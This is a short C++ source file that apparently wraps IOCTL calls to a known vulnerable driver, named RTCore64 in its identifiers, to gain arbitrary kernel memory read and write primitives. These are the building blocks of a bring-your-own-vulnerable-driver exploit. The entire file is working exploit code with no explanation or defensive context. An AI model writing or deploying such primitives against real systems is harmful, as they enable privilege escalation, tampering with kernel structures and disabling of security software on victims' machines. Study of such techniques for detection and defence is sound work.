#include "vuln_drv.h"

DWORD ReadMemoryPrimitive(HANDLE device, DWORD size, DWORD64 address)
{
	RTCORE64_MEMORY_READ MemoryRead{};

	MemoryRead.Address = address;

	MemoryRead.ReadSize = size;

	DWORD BytesReturned;

	DeviceIoControl(device, RTCORE64_MEMORY_READ_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned, nullptr);

	return MemoryRead.Value;
}


DWORD ReadMemoryDWORD(HANDLE device, DWORD64 address)
{
	return ReadMemoryPrimitive(device, 4, address);
}


DWORD64 ReadMemoryDWORD64(HANDLE device, DWORD64 address)
{
	return (static_cast<DWORD64>(ReadMemoryDWORD(device, address + 4)) << 32) | ReadMemoryDWORD(device, address);
}


void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value)
{

	RTCORE64_MEMORY_READ MemoryRead{};

	MemoryRead.Address = Address;

	MemoryRead.ReadSize = Size;

	MemoryRead.Value = Value;

	DWORD BytesReturned;

	DeviceIoControl(Device, RTCORE64_MEMORY_WRITE_CODE, &MemoryRead, sizeof(MemoryRead), &MemoryRead, sizeof(MemoryRead), &BytesReturned, nullptr);

}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value)
{

	WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);

	WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);

}
